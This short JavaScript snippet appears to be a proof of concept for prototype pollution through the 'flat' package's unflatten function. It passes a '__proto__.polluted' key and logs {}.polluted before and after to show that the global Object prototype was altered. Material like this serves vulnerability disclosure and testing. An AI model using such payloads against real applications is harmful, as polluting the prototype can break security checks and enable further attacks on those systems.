var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var unflatten = require('flat').unflatten;
console.log({}.polluted);
unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);